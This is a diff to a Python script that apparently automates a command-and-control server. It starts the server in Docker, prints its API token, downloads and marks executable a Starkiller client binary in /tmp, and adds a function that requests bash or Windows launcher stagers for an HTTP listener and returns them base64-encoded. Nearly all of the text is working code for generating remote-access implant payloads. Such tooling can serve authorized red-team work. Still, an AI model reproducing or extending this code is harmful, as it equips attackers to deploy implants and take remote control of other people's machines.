@@ -4,6 +4,7 @@ import subprocess
 import requests
 import json
 from time import sleep
+import base64
 
 def c2() -> None | str:
     is_up = 0
@@ -16,7 +17,8 @@ def c2() -> None | str:
                 client.containers.list(all)[i].start()
                 sleep(25)
                 token = c2_token()
-                print('[+] C2 started successfully from existing docker (ID: {0}'.format(client.containers.list(all)[i].short_id))
+                print('[+] C2 started successfully from existing docker (ID: {0})'.format(client.containers.list(all)[i].short_id))
+                print('[+] C2 token : {0}'.format(token))
                 print('[+] Listening on port 8888 (CLIHTTP)')
                 return client.containers.list(all)[i].short_id, token
         if is_up == 0:
@@ -32,7 +34,7 @@ def starkiller():
         r_github = requests.get(url_starkiller, allow_redirects=True)
         open('/tmp/starkiller', 'wb').write(r_github.content)
     subprocess.Popen(["chmod", "+x", "/tmp/starkiller"])
-    subprocess.Popen(["/tmp/starkiller"])
+    #subprocess.Popen(["/tmp/starkiller"])
 
 def deploy_c2():
     client = docker.from_env()
@@ -55,10 +57,21 @@ def c2_token():
     r_listener = requests.post(url_listener, headers=headers, json=param_listener, verify=False)
     return token
 
-def get_stager(system):
+def get_stager(system, token):
     if system == 'linux':
-        print(system)
+        system = 'multi/bash'
     elif system == 'windows':
-        print(system)
+        system = 'multi/launcher'
     else:
         return "Error: OS not defined."
+
+    url_stager = 'https://localhost:1337/api/stagers?token={0}'.format(token)
+    param_stager = {"StagerName":"{0}".format(system), "Listener":"CLIHTTP"}
+    headers_stager = {"Content-Type": "application/json"}
+    r_stager = requests.post(url_stager, headers=headers_stager, json=param_stager, verify=False)
+    payload = json.loads(r_stager.text)
+    payload = payload[system]['Output']
+    message_bytes = payload.encode('ascii')
+    rs_b64 = base64.b64encode(message_bytes)
+
+    return rs_b64
